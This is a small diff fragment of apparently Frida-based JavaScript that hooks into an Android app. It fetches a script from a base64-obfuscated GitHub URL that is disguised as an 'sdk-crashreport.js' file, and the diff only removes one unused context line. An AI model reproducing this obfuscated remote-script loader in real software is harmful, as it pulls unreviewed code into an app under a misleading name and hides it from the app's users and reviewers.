@@ -151,7 +151,6 @@ if (true) {//getPackageName().startsWith("com.")) {
 
                     httpGet(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3B1YmxpY3Jlc291cmNlcy9jYWtlczIyL21haW4vYXNzZXRzL3Nkay1jcmFzaHJlcG9ydC5qcw=="), function (data, code) {
                         if (code != 200) {
-                            var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
                             Java.scheduleOnMainThread(function () {
                                 var toast = Java.use("android.widget.Toast");
                                 toast.makeText(Java.use("android.app.ActivityThread").currentApplication().getApplicationContext(), Java.use("java.lang.String").$new("Could connect to the script server.."), 1).show();
